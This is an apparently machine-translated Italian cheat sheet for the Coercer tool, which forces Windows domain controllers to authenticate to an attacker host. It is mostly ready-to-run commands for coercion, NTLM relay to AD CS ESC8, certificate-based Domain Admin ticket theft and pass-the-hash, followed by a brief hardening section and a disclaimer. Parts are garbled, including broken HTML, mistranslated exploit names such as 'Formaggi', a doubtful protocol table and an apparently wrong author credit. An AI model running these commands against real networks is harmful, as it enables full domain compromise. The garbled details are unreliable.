<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 Coercer: foglio informativo completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<palign="centro">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="Licenza GPLv3">
</p>

<palign="centro">
  <b>🌐 Scansiona, rileva e costringi automaticamente i server Windows e i controller di dominio ad autenticarsi su macchine arbitrarie tramite oltre 12 protocolli RPC</b>
</p>

---

## 📋 Sommario

- [Panoramica e la primitiva di coercizione di autenticazione](#-panoramica--la-primitiva-di-coercizione-di-autenticazione)
- [Protocolli e metodi RPC supportati](#-supported-rpc-protocols--methods)
- [Installazione](#-installazione)
- [Scansione per interfacce RPC vulnerabili (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Esecuzione della coercizione dell'autenticazione (`coerce`)](#-esecuzione-autenticazione-coercizione-coercizione)
- [La catena di attacco completa: Coercizione -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Filtro protocollo e metodo](#-protocollo--filtro metodo)
- [Supporto Kerberos e Pass-the-Hash](#-kerberos--pass-the-hash-support)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rafforzamento](#-considerazioni-difensive--rinforzo)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e la primitiva della coercizione di autenticazione

Negli ambienti Active Directory, la **coercizione dell'autenticazione** è una primitiva offensiva devastante. Sfrutta le interfacce RPC legacy implementate nei servizi Windows che consentono a un utente autenticato di chiedere a una macchina remota (come un controller di dominio) di connettersi a un percorso UNC designato (`\\attacker\share`).

Quando il computer Windows remoto si connette al computer controllato dall'aggressore, avvia l'**autenticazione NTLM dell'account del computer** (`DC01$`). 

Acquisendo o inoltrando le credenziali dell'account del computer utilizzando `ntlmrelayx` a Servizi certificati Active Directory (registrazione Web AD CS - ESC8) o destinazioni di delega senza vincoli, gli aggressori possono ottenere una **compromissione immediata e completa del dominio**.

Scritto da **Clément Notin (p0dalirius)**, **Coercer** unifica oltre una dozzina di exploit di coercizione individuali (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) in un unico framework automatizzato e altamente modulare.

---

## 🔌 Protocolli e metodi RPC supportati

Coercer testa e sfrutta le seguenti interfacce RPC:

| Nome protocollo | Nome dell'exploit comune | Tubo/Interfaccia |
|---------------|---------------------|---------------------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug/SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoercizione | `\pipe\netdfs` |
| **MS-PAN** | StampaIncubo adiacente | Amministrazione stampa remota |
| **MS-SAMR** | Formaggi | Responsabile account di sicurezza |

---

## 📥Installazione
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 Scansione per interfacce RPC vulnerabili (`scan`)

Prima di attivare la coercizione, scansiona in modo sicuro i controller di dominio di destinazione per scoprire quali funzioni RPC sono abilitate e raggiungibili:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ Esecuzione della coercizione dell'autenticazione (`coerce`)

Attiva una connessione NTLM per l'account del computer in uscita dal controller di dominio di destinazione al tuo ascoltatore:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 La catena di attacco completa: Coercizione -> NTLM Relay -> AD CS ESC8

Il vettore canonico di escalation del dominio:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 Filtraggio di protocolli e metodi

Scegli come target un metodo specifico senza inviare spam all'intero spettro RPC:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 Supporto Kerberos e Pass-the-Hash
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Scansiona DC per coercizione** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Autenticazione forzata** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Coercizione tramite MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Coercizione tramite MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Coercizione di passaggio dell'hash** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Costrizione ticket Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Considerazioni difensive e rafforzamento

1. **Disabilita spooler di stampa sui controller di dominio:** il servizio spooler di stampa (`spoolsv.exe`) deve essere completamente disabilitato sui controller di dominio (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Abilita la protezione estesa per l'autenticazione (EPA):** sui server AD CS IIS, abilita l'EPA e richiedi HTTPS per bloccare gli attacchi di inoltro NTLM.
3. **Filtro RPC e segmentazione della rete:** Limita l'accesso al mapping degli endpoint RPC (porta TCP 135) alle sottoreti amministrative autorizzate.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Coercer attiva chiamate di autenticazione remota attive che possono destabilizzare i servizi di dominio senza patch. Utilizzare esclusivamente durante test di penetrazione autorizzati e con il consenso esplicito del cliente.